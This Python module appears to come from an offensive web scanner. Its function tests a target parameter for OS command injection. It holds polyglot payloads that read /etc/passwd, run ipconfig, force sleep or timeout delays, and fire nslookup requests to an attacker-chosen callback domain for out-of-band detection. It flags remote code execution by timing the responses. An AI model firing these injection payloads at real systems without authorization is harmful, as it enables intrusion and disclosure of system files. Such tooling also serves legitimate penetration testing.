from src.httpreqs.request import REQUEST
from src.httpreqs.request import prepareRequest
from src.configs.config import proxies
from src.utils.arguments import args
from src.servers.ICMPServer import ICMPThread
from src.utils import colors
from src.utils.stats import stats
import string
import random
import time

def is_value_in_dict(dictionary, target_value):
    for key, value in dictionary.items():
        if key == target_value or value == target_value:
            return True 
    return False

def get_key_for_value(dictionary, target_value):
    for key, value in dictionary.items():
        if key == target_value or value == target_value:
            return key
    return ""

def generate_random_alphanumeric():
    alphanumeric_chars = string.ascii_letters + string.digits
    return ''.join(random.choices(alphanumeric_chars, k=5))

def test_cmd_injection(url, post):
    if(args.verbose):
        print(colors.blue("[i]") + " Testing results-based OS command injection...")
    
    cmdList = []
    cmdList.append("1;cat${IFS}/etc/passwd;#${IFS}';cat${IFS}/etc/passwd;#${IFS}\";cat${IFS}/etc/passwd;#${IFS}")
    cmdList.append("1&ipconfig /all&`ipconfig /all`&\"1&ipconfig /all&`ipconfig /all`&")

    # Linux time-based sleep polyglot - OK
    cmdList.append("1;sleep${IFS}7;#${IFS}';sleep${IFS}7;#${IFS}\";sleep${IFS}7;#${IFS}")
    # Windows time-based sleep polyglot - TODO TEST
    cmdList.append("1&timeout 7&`timeout 7`&\"1&timeout 7&`timeout 7`&")

    randomVal = []
    # Generate 7 random dns subdomains
    for i in range(7):
        randomVal.append(generate_random_alphanumeric())

    if(args.callback):
        cmdList.append("1;nslookup${IFS}"+randomVal[0]+"."+args.callback+";#${IFS}';nslookup${IFS}"+randomVal[1]+"."+args.callback+";#${IFS}\";nslookup${IFS}"+randomVal[2]+"."+args.callback+";#${IFS}")
        cmdList.append("1&nslookup "+randomVal[3]+"."+args.callback+"&`nslookup "+randomVal[4]+"."+args.callback+"`&\"1&nslookup "+randomVal[5]+"."+args.callback+"&`nslookup "+randomVal[6]+"."+args.callback+"`&".format(randomVal[3], randomVal[4], randomVal[5]))

    nslookupFlag = False
    callbackFlag = False
    for i in range(len(cmdList)):
        u, reqHeaders, postTest = prepareRequest(args.param, cmdList[i], url, post)

        if("nslookup" in cmdList[i] and args.verbose and not nslookupFlag):
            nslookupFlag = True
            if(args.verbose): print(colors.blue("[i]") + " Trying to provoke an external callback to '" + args.callback + "'. Check your listener logs...")
        elif("sleep" in cmdList[i] or "timeout" in cmdList[i] and args.verbose and not callbackFlag):
            callbackFlag = True
            if(args.verbose): print(colors.blue("[i]") + " Trying to provoke a delay with time-based blind polyglot...")

        start_time = time.time()
        r, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "CMD")
        end_time = time.time()
        response_time = end_time - start_time

        if(response_time > 7): 
            stats["vulns"] += 1
            if(args.postreq): print(colors.green("[+]") + " RCE -> '" + u + "' -> HTTP POST - '" + postTest + "'")
            else: print(colors.green("[+]") + " RCE -> '" + u + "'")
            
            if(is_value_in_dict(reqHeaders, args.param)):
                print(colors.green("[+]") + " RCE -> '" + u + "'")
                print(reqHeaders)

            print(colors.green("[i]") + " Reason: response time is " + str(response_time))

        if(not br or args.quick): return

